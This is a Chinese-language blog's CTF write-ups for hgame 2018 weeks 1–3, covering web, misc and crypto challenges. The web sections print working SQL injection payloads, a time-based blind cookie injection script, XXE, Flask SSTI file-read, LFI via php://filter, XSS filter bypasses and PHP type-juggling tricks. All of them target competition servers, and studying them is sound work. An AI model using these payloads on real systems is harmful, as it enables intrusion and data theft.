      <link href="/2018/01/15/2018-hgame%20CTFwp%EF%BC%88%E6%9D%AD%E7%94%B5%E4%BF%A1%E5%AE%89%EF%BC%89week3/"/>
      <url>/2018/01/15/2018-hgame%20CTFwp%EF%BC%88%E6%9D%AD%E7%94%B5%E4%BF%A1%E5%AE%89%EF%BC%89week3/</url>
      
        <content type="html"><![CDATA[<h2 id="送分的sqli"><a href="#送分的sqli" class="headerlink" title="送分的sqli"></a>送分的sqli</h2><p>这题没有任何过滤什么的，真的是很简单了。  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 and 1&#x3D;-1 union select 1,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure><p>查看库名，得：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1    information_schema</span><br><span class="line">1    test</span><br><span class="line">1    week3_sqliiii2</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;-1 union select 1,table_name from information_schema.tables</span><br></pre></td></tr></table></figure><p>查表，得：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">。。。</span><br><span class="line">1    test</span><br><span class="line">1    f111aa4g</span><br><span class="line">1    users</span><br></pre></td></tr></table></figure><p>猜测在f111aa4g里：  </p><p>查列名</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and 1&#x3D;-1 union select 1,column_name from information_schema.columns</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1    f111aaaggg_w3</span><br><span class="line">1    username</span><br></pre></td></tr></table></figure><p>猜测在f111aaaggg_w3里。<br>最后payload：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.25.18.223:10068&#x2F;?id&#x3D;-1 union select 1,f111aaaggg_w3 from  f111aa4g</span><br></pre></td></tr></table></figure><p>得到flag。  </p><h2 id="正常的SQLi"><a href="#正常的SQLi" class="headerlink" title="正常的SQLi"></a>正常的SQLi</h2><p>描述<br>出题人终于换端口了    我们来一发正常的SQLi吧<br>URL <a href="http://123.206.203.108:10010/normalSQLi/index.php">http://123.206.203.108:10010/normalSQLi/index.php</a><br>基准分数 250<br>当前分数 250<br>完成人数 39  </p><p>表哥提醒：cookie时间盲注<br>抓包发现cookie值：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cookie: name&#x3D;Z3Vlc3Q%3D; isadmin&#x3D;0</span><br></pre></td></tr></table></figure><p>有源码泄露：<a href="http://123.206.203.108:10010/normalSQLi/index.php.bak">http://123.206.203.108:10010/normalSQLi/index.php.bak</a>   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">$username &#x3D; base64_decode($_COOKIE[&#39;name&#39;]);</span><br><span class="line"></span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">$sql &#x3D; &quot;select * from user where username &#x3D; &#39;&#123;$username&#125;&#39;&quot;;</span><br><span class="line">$re &#x3D; mysqli_query($conn, $sql);</span><br><span class="line">$rs &#x3D; mysqli_fetch_array($re);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; echo $rs[&#39;flag&#39;];</span><br><span class="line">echo $username . &#39;&lt;br&#x2F;&gt;&#39;;</span><br><span class="line">echo &quot;因为出题人太懒了，所以现在没有任何功能&quot;;</span><br><span class="line"></span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>cookie的name是注入点，base64编码。   </p><p>用的是表哥的脚本：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;123.206.203.108:10010&#x2F;normalSQLi&#x2F;index.php&quot;</span><br><span class="line">flag &#x3D; &quot;&quot;</span><br><span class="line">for i in range(1,1000):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload &#x3D; &quot;admin&#39; or if((ascii(substr((select flag from user limit 2,1),%s,1))&#x3D;%s),sleep(3),false)#&quot;%(i,j)</span><br><span class="line">        cookie &#x3D; &#123;</span><br><span class="line">            &quot;name&quot;:urllib.quote(base64.b64encode(payload))</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r &#x3D; requests.get(url&#x3D;url,cookies&#x3D;cookie,timeout&#x3D;2.5)</span><br><span class="line">        except:</span><br><span class="line">            flag +&#x3D;chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>flag： hgame{fLag_1s_h4re…..}</p><h2 id="书店"><a href="#书店" class="headerlink" title="书店"></a>书店</h2><p> XXE xml实体注入   </p><blockquote><p>ENTITY 实体<br>在一个甚至多个XML文档中频繁使用某一条数据，我们可以预先定义一个这条数据的“别名”，即一个ENTITY，然后在这些文档中需要该数据的地方调用它。<br>XML定义了两种类型的ENTITY，一种在XML文档中使用，另一种作为参数在DTD文件中使用。    </p></blockquote><p>ENTITY的定义语法：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE  文件名 [</span><br><span class="line">    &lt;!ENTITY  实体名 &quot;实体内容&quot;&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure><p>大概看了一些文档，理解了一下，尝试：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;hgame&#x2F;selectBook?type&#x3D;dz HTTP&#x2F;1.1</span><br><span class="line">Host: 120.79.208.173:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko&#x2F;20100101 Firefox&#x2F;57.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Referer: http:&#x2F;&#x2F;120.79.208.173:8080&#x2F;hgame&#x2F;index.jsp</span><br><span class="line">Cookie: JSESSIONID&#x3D;08CEBA8F1F775DC3EA34F98711AB9D89</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE netspi [&lt;!ELEMENT methodname ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;a&#x2F;b&#x2F;flag.txt&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;search&gt;type sth!&lt;&#x2F;search&gt;</span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>但是无果。可能还是没太弄懂这个姿势。</p><h2 id="ngc’s-blog"><a href="#ngc’s-blog" class="headerlink" title="ngc’s blog"></a>ngc’s blog</h2><p>表哥提示STTI，于是了解了<a href="http://klaus.link/2017/Flask_SSTI/">一些文档</a>。  </p><p>‘.<strong>class</strong> 可以访问到字符串的类型对象  </p><p>使用 <strong>mro</strong>(Method Resolution Order) 直接获得对象的继承链, python用这个方法来确定对象方法解析的顺序   </p><p>用 <strong>subclasses</strong>()来获得当前环境下能够访问的所有对象.   </p><p>接下来的做法有点像sql注入（查表）   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Oops! That page doesn&#39;t exist.</span><br><span class="line">http:&#x2F;&#x2F;111.230.105.104:5000&#x2F;&lt;type &#39;str&#39;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;&#39;.__class__.__mro__</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Oops! That page doesn&#39;t exist.</span><br><span class="line">http:&#x2F;&#x2F;111.230.105.104:5000&#x2F;(&lt;type &#39;str&#39;&gt;, &lt;type &#39;basestring&#39;&gt;, &lt;type &#39;object&#39;&gt;)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180302/CC858f5kcE.png?imageslim" alt="mark"><br>找到file，<br>然后读取：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;.&#x2F;flag&#39;, &#39;r&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>flag</strong>：  hgame{skdvhdsbvadvnjVADBVS}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2018-hgame CTF week2</title>
      <link href="/2018/01/08/2018-hgame%20CTFwp%EF%BC%88%E6%9D%AD%E7%94%B5%E4%BF%A1%E5%AE%89%EF%BC%89week2/"/>
      <url>/2018/01/08/2018-hgame%20CTFwp%EF%BC%88%E6%9D%AD%E7%94%B5%E4%BF%A1%E5%AE%89%EF%BC%89week2/</url>
      
        <content type="html"><![CDATA[<h2 id="草莓社区-1"><a href="#草莓社区-1" class="headerlink" title="草莓社区-1"></a>草莓社区-1</h2><blockquote><p>描述<br>flag在../flag.php中<br>知识点：LFI<br>URL <a href="http://118.25.18.223:10011/">http://118.25.18.223:10011/</a><br>基准分数 100<br>当前分数 100<br>完成人数 118   </p></blockquote><p>提示很清楚，简单的本地包含：<br>payload： <a href="http://118.25.18.223:10011/show_maopian.php?mao=../flag.php">http://118.25.18.223:10011/show_maopian.php?mao=../flag.php</a><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180302/f82GJG72cj.png?imageslim" alt="mark"><br>一开始以为不对，F12找了源文件，发现flag的base64码。解得：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64decode(&quot;PD9waHAKCSRmbGFnPSJoZ2FtZXsjTWEwX3BpNG5faGFPX2s0bl9tYSN9IjsK&quot;)</span><br><span class="line">b&#39;&lt;?php\n\t$flag&#x3D;&quot;hgame&#123;#Ma0_pi4n_haO_k4n_ma#&#125;&quot;;\n&#39;</span><br></pre></td></tr></table></figure><h2 id="草莓社区-2"><a href="#草莓社区-2" class="headerlink" title="草莓社区- 2"></a>草莓社区- 2</h2><blockquote><p>描述<br>flag在../flag.php中<br>知识点：LFI<br>URL <a href="http://118.25.18.223:10012/">http://118.25.18.223:10012/</a><br>基准分数 150<br>当前分数 150<br>完成人数 103  </p></blockquote><p>和上一题肯定不一样咯。试了试   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;118.25.18.223:10012&#x2F;show_maopian.php?mao&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;show_maopian.php</span><br></pre></td></tr></table></figure><p>读取php。发现可行。   </p><p>读取../flag.php试试。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180302/eb4m47kagm.png?imageslim" alt="mark">   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; base64.b64decode(&quot;UEQ5d2FIQUtDU1JtYkdGblBTSm9aMkZ0WlhzaGJUUnZYM0JwTkc1ZlEyaGhUMTlvWVc5ZmEyRnVJWDBpT3dvPQ&#x3D;&#x3D;&quot;)</span><br><span class="line">b&#39;PD9waHAKCSRmbGFnPSJoZ2FtZXshbTRvX3BpNG5fQ2hhT19oYW9fa2FuIX0iOwo&#x3D;&#39;</span><br><span class="line">&gt;&gt;&gt; base64.b64decode(&quot;PD9waHAKCSRmbGFnPSJoZ2FtZXshbTRvX3BpNG5fQ2hhT19oYW9fa2FuIX0iOwo&#x3D;&quot;)</span><br><span class="line">b&#39;&lt;?php\n\t$flag&#x3D;&quot;hgame&#123;!m4o_pi4n_ChaO_hao_kan!&#125;&quot;;\n&#39;</span><br></pre></td></tr></table></figure><h2 id="xss-1"><a href="#xss-1" class="headerlink" title="xss-1"></a>xss-1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function charge(input) &#123;</span><br><span class="line">    input &#x3D; input.replace(&#x2F;script&#x2F;gi, &#39;_&#39;);</span><br><span class="line">input &#x3D; input.replace(&#x2F;image&#x2F;gi, &#39;_&#39;);</span><br><span class="line">input &#x3D; input.replace(&#x2F;\(&#x2F;, &#39;_&#39;);</span><br><span class="line"></span><br><span class="line">    return &#39;&lt;article&gt;&#39; + input + &#39;&lt;&#x2F;article&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>/gi 忽略大小写，全文匹配。<br>过滤了srcipt，image，( 。<br>于是想用错误事件。<br><strong>payload：</strong> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;x  onerror&#x3D;alert(1);&gt;</span><br></pre></td></tr></table></figure><p><strong>flag：</strong> hgame  </p><h2 id="XSS-2"><a href="#XSS-2" class="headerlink" title="XSS-2"></a>XSS-2</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function charge(input) &#123; </span><br><span class="line">            input &#x3D; input.replace(&#x2F;script&#x2F;gi, &#39;_&#39;); </span><br><span class="line">            input &#x3D; input.replace(&#x2F;img&#x2F;gi, &#39;_&#39;); </span><br><span class="line">            input &#x3D; input.replace(&#x2F;image&#x2F;gi, &#39;_&#39;); </span><br><span class="line">            input &#x3D; input.replace(&#x2F;\(&#x2F;, &#39;_&#39;);</span><br><span class="line">            input &#x3D; input.replace(&#x2F;\&gt;&#x2F;,&#39;_&#39;);</span><br><span class="line">            return &#39;&lt;input value&#x3D;&quot;&#39; + input + &#39;&quot; type&#x3D;&quot;text&quot;&gt;&#39;; </span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>过滤了script, img, image, (, &gt;,<br>我一看想着，直接用Unicode算了。<br><strong>payload：</strong>  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;</span><br></pre></td></tr></table></figure><p>flag：  hgame</p><h2 id="最简单的sql题"><a href="#最简单的sql题" class="headerlink" title="最简单的sql题"></a>最简单的sql题</h2><p>太简单了，直接万能密码就行：  </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; or 1&#x3D;1 --</span><br></pre></td></tr></table></figure><p>flag:  hgame{@s0ng_fen_ti@}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2018-hgame CTF week1</title>
      <link href="/2018/01/01/2018-hgame%20CTFwp%EF%BC%88%E6%9D%AD%E7%94%B5%E4%BF%A1%E5%AE%89%EF%BC%89week1/"/>
      <url>/2018/01/01/2018-hgame%20CTFwp%EF%BC%88%E6%9D%AD%E7%94%B5%E4%BF%A1%E5%AE%89%EF%BC%89week1/</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf.vidar.club/">原题链接</a><br>由于开放时间短，不知道什么时候结束。我会将题目的大致内容以图片形式down下来。   </p><h1 id="web"><a href="#web" class="headerlink" title="web"></a><em>web</em></h1><hr><h2 id="1-Are-you-from-Europe"><a href="#1-Are-you-from-Europe" class="headerlink" title="1 Are you from Europe?"></a>1 Are you from Europe?</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JJdie248A4.png?imageslim" alt="mark"><br>URL <a href="http://123.206.203.108:10001/European.html">http://123.206.203.108:10001/European.html</a><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/gd25ef4EeC.png?imageslim" alt="mark"><br>一看题，就感觉想是用burp抓包做，来自欧洲，就想到改语言，accept-langue字段。<br>但是，我试了en，gk等等值，并没有什么卵用。而且发现动态调用是用js实现的也就是说，没有调用服务的数据。   </p><p>于是想到可能是在js里设了坑。   </p><p>查看源码：<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/ej2FL8DjfB.png?imageslim" alt="mark"><br>发现猫腻eval,  于是换成alert ，查看函数内容:<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/If9CL4GK5e.png?imageslim" alt="mark">   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function soHappy()&#123;var buy&#x3D;confirm(&quot;SSR！欧洲人，你愿意献祭你全部的 SSR 来获取 flag 吗？&quot;);</span><br><span class="line">if(!$(&quot;#serv5&quot;).html()&amp;&amp;!$(&quot;#craft5&quot;).html())&#123;alert(&quot;你根本不是欧洲人。&quot;);return&#125;</span><br><span class="line">var flag&#x3D;&quot;&quot;;flag+&#x3D;&quot;&quot;;flag+&#x3D;&quot;&quot;;flag+&#x3D;&quot;&quot;;flag+&#x3D;&quot;hgame&quot;;flag+&#x3D;&quot;&#123;&quot;;flag+&#x3D;&quot;T&quot;;flag+&#x3D;&quot;h&quot;;</span><br><span class="line">flag+&#x3D;&quot;3&quot;;flag+&#x3D;&quot;_&quot;;flag+&#x3D;&quot;C&quot;;flag+&#x3D;&quot;h&quot;;flag+&#x3D;&quot;0&quot;;flag+&#x3D;&quot;s&quot;;flag+&#x3D;&quot;e&quot;;flag+&#x3D;&quot;N&quot;;flag+&#x3D;&quot;_&quot;;</span><br><span class="line">flag+&#x3D;&quot;0&quot;;flag+&#x3D;&quot;n&quot;;flag+&#x3D;&quot;E&quot;;flag+&#x3D;&quot;!&quot;;flag+&#x3D;&quot;&#125;&quot;;if(buy)&#123;$(&quot;#serv5&quot;).remove();$(&quot;#craft5&quot;).remove();</span><br><span class="line">alert(&quot;兑换成功。flag: &quot;+flag)&#125;else&#123;alert(&quot;你失去了唯一的机会。&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>相信大家的机智，都看到flag了。    </p><p><strong>flag：</strong> hgame{Th3_Ch0seN_0nE!}</p><p><strong>知识点:</strong>   js审计   </p><p><strong>反思:</strong> 这题容易被题目本身带到抓包http协议的道上，但是这是错的。本身网页只是js动态，没有服务器请求。    </p><h2 id="2-special-number"><a href="#2-special-number" class="headerlink" title="2 special number"></a>2 special number</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180213/a89gJh73di.png?imageslim" alt="mark"><br>URL <a href="http://118.25.18.223:10001/">http://118.25.18.223:10001</a><br>进url，是一段php源码：   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">    if(isset($_GET[&#39;key&#39;]))&#123;</span><br><span class="line">        $pattern &#x3D; &#39;&#x2F;^(?&#x3D;.*[0-9].*)(?&#x3D;.*[a-zA-Z].*).&#123;7,&#125;$&#x2F; &#39;;</span><br><span class="line">        $key &#x3D; $_GET[&#39;key&#39;];</span><br><span class="line">        if(preg_match($pattern,$key)&#x3D;&#x3D;&#x3D;0)&#123;</span><br><span class="line">            echo &quot;格式错误&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $lock&#x3D;&quot;******************&quot;;</span><br><span class="line">            $b &#x3D; json_decode($key);</span><br><span class="line">            if($b&#x3D;&#x3D;$lock)</span><br><span class="line">                echo $flag;</span><br><span class="line">            else</span><br><span class="line">                echo &quot;this is no special number&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>下面开始审计：    </p><ol><li><p>读懂这段正则</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pattern &#x3D; &#39;&#x2F;^(?&#x3D;.*[0-9].*)(?&#x3D;.*[a-zA-Z].*).&#123;7,&#125;$&#x2F; &#39;;</span><br></pre></td></tr></table></figure><p>(?=.<em>[0-9].</em>)    包含0-9任意字符<br>(?=.<em>[a-zA-Z].</em>)   包含a-zA-Z任意字符<br>{7,}      7位以上    </p></li><li><p><a href="http://php.net/manual/zh/function.json-decode.php">json_decode</a><br>用于将json字符串，解密成对象或数组。   </p></li><li><p>$lock是不知道的，但是由于用的是==，不对类型做比较，因此需要做的是绕过！！！   </p></li><li><p><a href="https://www.cnblogs.com/Mrsm1th/p/6745532.html">关于php弱类型，一篇很好的总结</a>   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> var_dump(&quot;admin&quot;&#x3D;&#x3D;0);  &#x2F;&#x2F;true</span><br><span class="line"> var_dump(&quot;1admin&quot;&#x3D;&#x3D;1); &#x2F;&#x2F;true</span><br><span class="line"> var_dump(&quot;admin1&quot;&#x3D;&#x3D;1) &#x2F;&#x2F;false</span><br><span class="line"> var_dump(&quot;admin1&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true</span><br><span class="line"> var_dump(&quot;0e123456&quot;&#x3D;&#x3D;&quot;0e4456789&quot;); &#x2F;&#x2F;true </span><br><span class="line">?&gt;  &#x2F;&#x2F;上述代码可自行测试</span><br></pre></td></tr></table></figure><p>因此，可以利用0==”string”,来绕过。   </p></li></ol><p><strong>payload：</strong> key=0e1233248<br><strong>flag:</strong>  hgame{pHp_w34k_typing_s000_e4sy}   </p><p>**知识点：  **php弱类型，正则</p><p><strong>反思：</strong> 我一开始，被json_decode 带跑了，试了各种<br>?key={“key”:0}<br>?key={“b”:0}<br>但是都不对，感觉这个json_decode 没什么用，尽迷惑人。    </p><h2 id="3-can-u-find-me"><a href="#3-can-u-find-me" class="headerlink" title="3. can u find me?"></a>3. can u find me?</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/lEc3leChHd.png?imageslim" alt="mark"><br>意思明显，这题是关于robots协议的，robots协议是规定爬虫限制的。<br>查看robots协议，加上/robots.txt即可。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/JG416AGfbj.png?imageslim" alt="mark"><br>看到disallow，不被允许爬取的页面是/f1aaaaaaaag.php    </p><p>但是我可以访问呀！<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/7LEiG3Bl3f.png?imageslim" alt="mark">   </p><p>下面容易想到了：  Burp修改请求的字段值<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/L2h06fljlH.png?imageslim" alt="mark"><br>guest-&gt; admin  即可。    </p><p><strong>知识点</strong>：  robots协议，http请求</p><p><strong>flag:</strong>  hgame{78e01ee77a39ef4e}</p><h2 id="4-tell-me-what-you-want"><a href="#4-tell-me-what-you-want" class="headerlink" title="4. tell me what you want"></a>4. tell me what you want</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180224/A0jHdJjk86.png?imageslim" alt="mark"><br>URL:  <a href="http://123.206.203.108:10001/">http://123.206.203.108:10001/</a><br>BP改就行了，一步步来，一开始Burp改POST，发现一直不对，hin烦。后来用hackbar改就行了，抓包貌似没什么区别。。。    </p><p><strong>知识点</strong>： http请求<br><strong>flag</strong>： hgame{For9e_hTTp_iS_N0T_HArd}</p><h2 id="5-我们不一样"><a href="#5-我们不一样" class="headerlink" title="5. 我们不一样"></a>5. 我们不一样</h2><p>我们不一样<br>描述<br>知识点：PHP弱类型<br>URL <a href="http://118.25.18.223:10002/">http://118.25.18.223:10002/</a><br>基准分数 50<br>当前分数 50<br>完成人数 189   </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">    if(isset($_POST[&#39;str1&#39;])&amp;&amp;isset($_POST[&#39;str2&#39;]))&#123;</span><br><span class="line">        </span><br><span class="line">        if ($_POST[&#39;str1&#39;]!&#x3D;$_POST[&#39;str2&#39;]&amp;&amp;strcmp($_POST[&#39;str1&#39;],$_POST[&#39;str2&#39;])&#x3D;&#x3D;0) &#123;</span><br><span class="line">            echo &quot;flag is:&quot;.$flag;</span><br><span class="line">            exit();</span><br><span class="line">        &#125; else&#123;</span><br><span class="line">            echo &quot;Something wrong..&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里考的是php弱类型，php中内置函数strcmp有不合理的地方：  </p><blockquote><p>strcmp()函数在PHP官方手册中的描述是int strcmp ( string $str1 , string $str2 ) ,需要给strcmp()传递2个string类型的参数。如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。</p><p>如果传入给出strcmp()的参数是数字呢？</p></blockquote><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$array&#x3D;[1,2,3];</span><br><span class="line">var_dump(strcmp($array,&#39;123&#39;)); &#x2F;&#x2F;null,在某种意义上null也就是相当于false。</span><br></pre></td></tr></table></figure><p><strong>payload</strong>：str1[]=[1,2,3]&amp;str2=123<br><strong>知识点</strong>： php弱类型<br><strong>flag</strong>： hgame{g3t_f14g_is_so0000_ez}</p><h1 id="msic"><a href="#msic" class="headerlink" title="msic"></a><em>msic</em></h1><hr><h2 id="白菜1"><a href="#白菜1" class="headerlink" title="白菜1"></a>白菜1</h2><p>描述<br>白菜1，希望大家多多关注国漫<br>知识点：图片隐写lsb<br>URL <a href="http://p1kaloi2x.bkt.clouddn.com/flag.png">http://p1kaloi2x.bkt.clouddn.com/flag.png</a><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/mEA6l99FaG.png?imageslim" alt="mark"><br>提示很清楚了，LSB隐写。看到PK，保存为zip，7-zip打开。即看到flag。     </p><h2 id="白菜2"><a href="#白菜2" class="headerlink" title="白菜2"></a>白菜2</h2><p>描述<br>还是我老婆hhh<br>知识点：初识文件结构<br>URL <a href="http://p1kaloi2x.bkt.clouddn.com/misc2.jpg">http://p1kaloi2x.bkt.clouddn.com/misc2.jpg</a><br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180225/d86g3JHejE.jpg?imageslim" alt="mark">   </p><p>由于是jpg，联系文件结构，容易想到图种。</p><h2 id="pacp1"><a href="#pacp1" class="headerlink" title="pacp1"></a>pacp1</h2><p>wireshark 打开， 搜索hgame，即得。</p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a><em>crypto</em></h1><h2 id="easy-Caesar"><a href="#easy-Caesar" class="headerlink" title="easy Caesar"></a>easy Caesar</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/ci2AgF42fC.png?imageslim" alt="mark"><br>vuoas{Hvs_ei8qy_pf7kb_1l_xIadg_cjSf_o_Zo9m_rCu}<br>凯撒加密，python脚本解密即可，注意数字又要进行移位。<br>flag： hgame{The_qu1ck_br0wn_4x_jUmps_ovEr_a_La2y_dOg}   </p><h2 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/8hc9FDgaCb.png?imageslim" alt="mark"><br>hgame{FDXDGDADDG_FXXFAAXFAG_GDFXFFXFFXADXFDA_GDAD}<br>棋盘密码，我是手解的。<br><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/50106kHbm7.png?imageslim" alt="mark"></p><p>flag：  hgame{fritz_nebel_invented_it}  </p><h2 id="confusion"><a href="#confusion" class="headerlink" title="confusion"></a>confusion</h2><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/blog/180301/GK5g9CB1ma.png?imageslim" alt="mark"></p><p>密文： –/.-./.-../-/-.-/-…./-.-/-..-/-./…-/–../-..-/–.-/.–/-…/…/-./.-/..—/..-./…/..-/..—/–./–./-…/…/.–/….-/…../-…/…/.-../.-/–../..-./..-/-…./…/…-/.—/-…/-./-../.-/–../…/.-./…./..-/-…./–.-/-…-/-…-/-…-/-…-</p><p>混合了很多种加密，但是不难看出：</p><p>第一个是莫尔斯电码；<br>解得MRLTK6KXNVZXQWBSNA2FSU2GGBSW45BSLAZFU6SVJBNDAZSRHU6Q；<br>由于数字只有2-6，容易猜测是base32；<br>解得：dW5yWmsxX2h4YSF0ent2X2ZzUHZ0fQ==<br>由于有大小写，推测是base64；<br>解得：unrZk1_hxa!tz{v_fsPvt}<br>容易想到栅栏密码。<br>转换为utnzr{Zvk_1f_shPxvat!}  </p><p>简单的凯撒密码：<br>hgame{Mix_1s_fuCking!}   </p><p>虽然不难，还是很想fuc*   </p><h2 id="Hill"><a href="#Hill" class="headerlink" title="Hill"></a>Hill</h2><p>希尔密码（Hill Cipher），是运用基本矩阵论原理的替换密码，每个字母当作26进制数字：A=0, B=1, C=2… 一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果mod26。用作加密的矩阵（即密匙）必须是可逆的，否则就不可能译码。只有矩阵的行列式和26互质，才是可逆的。<br><a href="https://www.cnblogs.com/xdjun/p/7472735.html">https://www.cnblogs.com/xdjun/p/7472735.html</a>   </p><p>一步步计算，就可以了。<br>我找到了一个站，有更详细的介绍和脚本。<br><a href="http://www.practicalcryptography.com/ciphers/hill-cipher/">www.practicalcryptography.com/ciphers/hill-cipher/</a>    </p><h2 id="baby-step"><a href="#baby-step" class="headerlink" title="baby step"></a>baby step</h2><p><img 